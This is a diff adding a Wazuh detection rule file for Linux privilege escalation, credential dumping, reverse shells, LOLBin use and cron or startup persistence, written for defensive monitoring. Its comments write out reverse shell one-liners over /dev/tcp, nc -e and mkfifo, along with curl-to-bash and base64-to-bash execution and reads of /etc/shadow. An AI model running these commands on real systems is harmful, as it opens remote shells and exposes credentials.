@@ -1,0 +1,318 @@
+<!--
+  ============================================================
+  ARCENUM SYSTEMS — Linux Suspicious Activity Detection Rules
+  ============================================================
+  Author:    Pradhyumna Ghogare
+  Copyright: © 2024 Pradhyumna Ghogare / Arcenum Systems
+  Version:   1.2.0
+  Updated:   2024
+
+  ZERO EXTERNAL DEPENDENCIES — No CDB lists required.
+  Drop into /var/ossec/etc/rules/ and restart wazuh-manager.
+
+  Coverage:
+  - Privilege escalation
+  - Credential access
+  - Reverse shell indicators
+  - Defense evasion / LOLBins
+  - Persistence via cron / startup files
+  ============================================================
+-->
+
+<group name="arcenum_linux_suspicious,">
+
+  <!-- ============================================================
+       PRIVILEGE ESCALATION
+  ============================================================ -->
+
+  <!-- WHY THIS FIRES: Attackers who gain low-privilege shell access
+       immediately attempt `sudo su` to escalate to root. This is
+       the single most common post-exploitation step on Linux.
+       Any sudo to /bin/su should be investigated. -->
+  <rule id="101001" level="12">
+    <if_sid>5403</if_sid>
+    <field name="command">/bin/su</field>
+    <description>Arcenum [HIGH]: Privileged sudo to root detected (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1548.003</id>
+    </mitre>
+    <group>privilege_escalation,arcenum_high,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: pkexec is the target of CVE-2021-4034 (PwnKit)
+       — a 12-year-old SUID vulnerability that gives any local user
+       instant root. Execution of pkexec outside normal GUI context
+       is a red flag for privilege escalation. -->
+  <rule id="101002" level="14">
+    <if_sid>5402,5403</if_sid>
+    <field name="command">pkexec</field>
+    <description>Arcenum [CRITICAL]: pkexec execution detected - possible CVE-2021-4034 PwnKit (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1068</id>
+    </mitre>
+    <group>privilege_escalation,exploit,arcenum_critical,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: chmod 777 gives world-readable/writable/executable
+       permissions. Attackers use this to make dropped payloads executable
+       or to weaken file permissions for persistence. -->
+  <rule id="101003" level="13">
+    <if_sid>5402,5403</if_sid>
+    <field name="command">chmod 777</field>
+    <description>Arcenum [HIGH]: chmod 777 on file detected - permission weakening (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1222</id>
+    </mitre>
+    <group>privilege_escalation,defense_evasion,arcenum_high,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: `sudo -l` lists all commands the current user
+       can run with elevated privileges. Attackers run this immediately
+       after gaining access to map privilege escalation paths. -->
+  <rule id="101004" level="13">
+    <if_sid>5402,5403</if_sid>
+    <match>sudo -l</match>
+    <description>Arcenum [HIGH]: sudo privilege enumeration - attacker mapping escalation paths (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1069</id>
+    </mitre>
+    <group>discovery,privilege_escalation,arcenum_high,</group>
+  </rule>
+
+  <!-- ============================================================
+       CREDENTIAL ACCESS
+  ============================================================ -->
+
+  <!-- WHY THIS FIRES: /etc/passwd contains user account info including
+       home directories and shells. Attackers read this to enumerate
+       users for targeted attacks or lateral movement. -->
+  <rule id="101010" level="14">
+    <if_sid>5402,5403</if_sid>
+    <match>cat /etc/passwd</match>
+    <description>Arcenum [HIGH]: /etc/passwd accessed - user enumeration attempt (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1003.008</id>
+    </mitre>
+    <group>credential_access,arcenum_high,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: /etc/shadow contains hashed passwords for all
+       system accounts. Accessing this file is a direct credential
+       dumping attempt — attacker intends to crack passwords offline.
+       This should NEVER fire in legitimate operations. -->
+  <rule id="101011" level="15">
+    <if_sid>5402,5403</if_sid>
+    <match>cat /etc/shadow</match>
+    <description>Arcenum [CRITICAL]: /etc/shadow accessed - active credential dumping (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1003.008</id>
+    </mitre>
+    <group>credential_access,arcenum_critical,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: `unshadow` combines /etc/passwd and /etc/shadow
+       into a format suitable for John the Ripper or Hashcat cracking.
+       Running unshadow means credential cracking is already in progress. -->
+  <rule id="101012" level="13">
+    <if_sid>5402,5403</if_sid>
+    <match>unshadow</match>
+    <description>Arcenum [HIGH]: unshadow tool executed - credential cracking in progress (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1003.008</id>
+    </mitre>
+    <group>credential_access,arcenum_high,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: Attackers generate SSH keys to establish persistent
+       backdoor access. A new SSH key added to authorized_keys gives
+       permanent access even after password reset. -->
+  <rule id="101013" level="13">
+    <if_sid>5402,5403</if_sid>
+    <match>ssh-keygen</match>
+    <description>Arcenum [HIGH]: SSH key generation - possible backdoor persistence setup (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1098.004</id>
+    </mitre>
+    <group>credential_access,persistence,arcenum_high,</group>
+  </rule>
+
+  <!-- ============================================================
+       REVERSE SHELL
+  ============================================================ -->
+
+  <!-- WHY THIS FIRES: bash's /dev/tcp pseudo-device allows opening
+       TCP connections without netcat. Attackers use `bash -i >& /dev/tcp/IP/PORT 0>&1`
+       to establish reverse shells that bypass firewall rules.
+       No legitimate script uses /dev/tcp in production. -->
+  <rule id="101020" level="15">
+    <if_sid>5402,5403</if_sid>
+    <match>/dev/tcp</match>
+    <description>Arcenum [CRITICAL]: Reverse shell via /dev/tcp - active C2 connection (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1059.004</id>
+    </mitre>
+    <group>execution,command_and_control,arcenum_critical,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: `bash -i` launches an interactive bash shell.
+       Combined with I/O redirection to a network socket, this is
+       the classic reverse shell one-liner used in every CTF and
+       real-world post-exploitation scenario. -->
+  <rule id="101021" level="14">
+    <if_sid>5402,5403</if_sid>
+    <match>bash -i</match>
+    <description>Arcenum [HIGH]: Interactive bash shell launch - reverse shell indicator (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1059.004</id>
+    </mitre>
+    <group>execution,arcenum_high,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: netcat with -e flag executes a program after
+       connection — `nc -e /bin/bash IP PORT` is the most common
+       reverse shell technique. Modern netcat versions disable -e
+       but attackers use older versions or ncat specifically for this. -->
+  <rule id="101022" level="15">
+    <if_sid>5402,5403</if_sid>
+    <match>nc -e</match>
+    <description>Arcenum [CRITICAL]: Netcat reverse shell -e flag - active backdoor (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1059.004</id>
+    </mitre>
+    <group>execution,command_and_control,arcenum_critical,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: mkfifo creates named pipes used in reverse shells
+       when /dev/tcp is unavailable. Pattern: mkfifo /tmp/f; cat /tmp/f |
+       /bin/sh -i 2>&1 | nc IP PORT > /tmp/f — this bypasses restrictions
+       on direct TCP connections from bash. -->
+  <rule id="101023" level="15">
+    <if_sid>5402,5403</if_sid>
+    <match>mkfifo</match>
+    <description>Arcenum [CRITICAL]: mkfifo named pipe - reverse shell preparation (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1059.004</id>
+    </mitre>
+    <group>execution,command_and_control,arcenum_critical,</group>
+  </rule>
+
+  <!-- ============================================================
+       DEFENSE EVASION / LOLBins
+  ============================================================ -->
+
+  <!-- WHY THIS FIRES: `curl URL | bash` downloads and executes a remote
+       script in one command — no file ever touches disk. This is the
+       most common initial access technique for Linux malware droppers,
+       cryptominers, and supply chain attacks. -->
+  <rule id="101030" level="13">
+    <if_sid>5402,5403</if_sid>
+    <match>curl</match>
+    <description>Arcenum [HIGH]: curl execution - possible remote script download (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1059.004</id>
+    </mitre>
+    <group>execution,defense_evasion,arcenum_high,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: Same as curl pipe but using wget. Attackers use
+       both interchangeably depending on what's available on the target.
+       wget is older and more commonly available on legacy Linux systems. -->
+  <rule id="101031" level="12">
+    <if_sid>5402,5403</if_sid>
+    <match>wget</match>
+    <description>Arcenum [HIGH]: wget execution - possible payload download (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1059.004</id>
+    </mitre>
+    <group>execution,defense_evasion,arcenum_high,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: Attackers encode payloads in base64 to bypass
+       simple string-based detection. `echo BASE64 | base64 --decode | bash`
+       is a common obfuscation technique to hide malicious commands
+       from basic monitoring tools. -->
+  <rule id="101032" level="11">
+    <if_sid>5402,5403</if_sid>
+    <match>base64 --decode</match>
+    <description>Arcenum [MEDIUM]: Base64 decode - obfuscated payload execution likely (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1027</id>
+    </mitre>
+    <group>defense_evasion,arcenum_medium,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: Setting SUID bit allows a binary to run with
+       owner's privileges regardless of who executes it. Attackers
+       set SUID on /bin/bash or custom binaries to maintain root access
+       even after their initial exploit is patched. -->
+  <rule id="101033" level="12">
+    <if_sid>5402,5403</if_sid>
+    <match>chmod +s</match>
+    <description>Arcenum [HIGH]: SUID bit set - persistent privilege escalation mechanism (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1548.001</id>
+    </mitre>
+    <group>privilege_escalation,arcenum_high,</group>
+  </rule>
+
+  <!-- ============================================================
+       PERSISTENCE — FIM BASED
+  ============================================================ -->
+
+  <!-- WHY THIS FIRES: Cron jobs execute commands on schedule without
+       user interaction. Attackers add cron entries to re-establish
+       reverse shells or execute payloads after reboots, ensuring
+       persistence even if their initial access method is removed. -->
+  <rule id="101040" level="11">
+    <if_group>syscheck</if_group>
+    <match>/etc/cron</match>
+    <description>Arcenum [MEDIUM]: Cron directory modified - scheduled persistence likely (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1053.003</id>
+    </mitre>
+    <group>persistence,arcenum_medium,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: Shell startup files (.bashrc, .profile) execute
+       every time a user opens a terminal. Attackers add reverse shell
+       commands here to re-establish C2 connections automatically,
+       making this one of the most resilient persistence mechanisms. -->
+  <rule id="101041" level="11">
+    <if_group>syscheck</if_group>
+    <regex>\.bashrc|\.bash_profile|\.profile|\.zshrc</regex>
+    <description>Arcenum [MEDIUM]: Shell startup file modified - shell persistence mechanism (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1546.004</id>
+    </mitre>
+    <group>persistence,arcenum_medium,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: /etc/init.d scripts run as root at system startup.
+       Attackers modify or add init scripts to execute malware before
+       any security tools or monitoring agents start — giving them
+       early boot persistence with root privileges. -->
+  <rule id="101042" level="12">
+    <if_group>syscheck</if_group>
+    <match>/etc/init.d</match>
+    <description>Arcenum [HIGH]: Init.d script modified - root-level boot persistence (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1543.002</id>
+    </mitre>
+    <group>persistence,arcenum_high,</group>
+  </rule>
+
+  <!-- WHY THIS FIRES: rc.local executes commands at the end of each
+       multiuser runlevel. It's a legacy but still-present persistence
+       mechanism. Adding a reverse shell here survives reboots and
+       runs with root privileges before any user logs in. -->
+  <rule id="101043" level="12">
+    <if_group>syscheck</if_group>
+    <match>/etc/rc.local</match>
+    <description>Arcenum [HIGH]: rc.local modified - boot-level persistence mechanism (© Pradhyumna Ghogare / Arcenum Systems)</description>
+    <mitre>
+      <id>T1543.002</id>
+    </mitre>
+    <group>persistence,arcenum_high,</group>
+  </rule>
+
+</group>
